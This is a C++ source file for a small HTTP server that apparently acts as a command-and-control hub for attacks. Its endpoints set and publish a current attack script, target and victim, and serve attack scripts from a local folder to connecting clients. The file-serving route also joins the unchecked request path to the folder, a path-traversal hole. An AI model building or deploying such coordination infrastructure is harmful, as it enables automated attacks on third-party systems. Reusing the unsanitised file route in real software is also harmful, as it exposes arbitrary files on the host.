#include "httplib.h"
#include <filesystem>
#include <fstream>
#include <mutex>
#include <string>

using namespace httplib;
namespace fs = std::filesystem;

static std::string current_script;
static std::string current_target;
static std::string current_victim;
static std::mutex  mtx;

std::vector<std::string> list_scripts() {
    std::vector<std::string> v;
    for (auto &p : fs::directory_iterator("scripts")) {
        auto name = p.path().filename().string();
        if (name.size() > 3 && 
           (name.substr(name.size()-3) == ".sh" ||
            name.substr(name.size()-4) == ".cpp"))
            v.push_back(name);
    }
    return v;
}

int main() {
    Server svr;

    svr.Post("/attack", [&](const Request& req, Response& res) {
        auto script = req.has_param("script") ? req.get_param_value("script") : "";
        auto target = req.has_param("target") ? req.get_param_value("target") : "";
        auto victim = req.has_param("victim") ? req.get_param_value("victim") : "";
        {
            std::lock_guard<std::mutex> lock(mtx);
            current_script = script;
            current_target = target;
            current_victim = victim;
        }
        res.set_content("OK", "text/plain");
    });

    svr.Get("/attack", [&](const Request&, Response& res) {
        std::lock_guard<std::mutex> lock(mtx);
        res.set_content(current_script + "|" + current_target + "|" + current_victim, "text/plain");
    });

    svr.Get(R"(/scripts/(.+))", [&](const Request& req, Response& res) {
        auto name = req.matches[1].str();
        fs::path p = fs::current_path() / "scripts" / name;

        if (!fs::exists(p)) {
            res.status = 404;
            return;
        }
        std::ifstream ifs(p, std::ios::binary);
        std::string body{ std::istreambuf_iterator<char>(ifs),
                          std::istreambuf_iterator<char>() };
        res.set_content(body, "text/plain");
    });

    svr.listen("0.0.0.0", 8001);
    return 0;
}